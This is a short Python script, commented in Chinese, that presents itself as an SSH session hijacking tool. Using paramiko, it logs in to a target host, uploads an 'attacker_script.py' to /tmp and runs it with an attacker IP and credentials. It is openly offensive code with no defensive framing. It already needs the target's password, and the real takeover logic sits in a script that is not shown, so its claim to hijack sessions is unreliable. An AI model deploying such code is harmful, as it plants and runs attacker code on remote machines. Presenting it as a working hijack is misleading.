import paramiko

def hijack_ssh_session(target_host, target_username, target_password, attacker_ip, attacker_username, attacker_password):
    # 创建SSH client对象
    ssh = paramiko.SSHClient()
    # 添加未知主機到認證列表
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        # 連線到目標主機
        ssh.connect(target_host, username=target_username, password=target_password)
        # 透過SFTP將相關文件上傳至目標主機，使用ssh.exec_command執行命令
        sftp = ssh.open_sftp()
        sftp.put("attacker_script.py", "/tmp/attacker_script.py")
        sftp.close()
        # 執行攻擊者腳本以接管SSH session
        ssh.exec_command("python /tmp/attacker_script.py --attacker_ip {} --attacker_username {} --attacker_password {}".format(attacker_ip, attacker_username, attacker_password))
    except paramiko.AuthenticationException:
        print("Authentication failed.")
    except paramiko.SSHException as e:
        print(str(e))
    finally:
        ssh.close()

# 使用範例
target_host = "target_host_ip"
target_username = "target_username"
target_password = "target_password"
attacker_ip = "attacker_ip"
attacker_username = "attacker_username"
attacker_password = "attacker_password"

hijack_ssh_session(target_host, target_username, target_password, attacker_ip, attacker_username, attacker_password)